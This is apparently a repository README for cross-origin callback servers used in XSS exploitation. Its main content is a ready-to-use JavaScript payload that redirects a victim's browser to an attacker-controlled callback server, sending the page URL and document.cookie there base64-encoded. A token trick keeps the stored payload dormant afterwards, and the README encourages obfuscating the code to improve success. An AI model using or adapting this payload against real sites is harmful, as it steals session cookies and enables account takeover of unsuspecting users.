A collection of Cross-Origin callback servers for XSS exploitation.

## Description

This repo contains a range of callback servers and an XSS payload that, once executed, will change the current window location of the victim to your callback server, which will respond with a **301 Moved Permanently** redirection back to where the victim came from (Origin), although this time with a token in the URL anchor, telling your (stored) XSS payload to stay dormant. Refine your payload as required.

## Usage

Use your callback server of choice and make sure it's listening.

Then throw the following code in your XSS payload. Be sure to change the address to that of your callback server, and change the token at the very least. The more you obfuscate this code, the higher your success rate will be, please do not open issues because it's not working for you.

```javascript
const token = "w3lRZ87e";
if (location.hash != token) self.location = "https://mycallbackserver.net/callback.php" + 
                	"?origin=" + encodeURIComponent( btoa(self.location.href) ) + 
                	"&data=" + encodeURIComponent( btoa(document.cookie) ) + 
                	"&token=" + encodeURIComponent( btoa(token) );
```
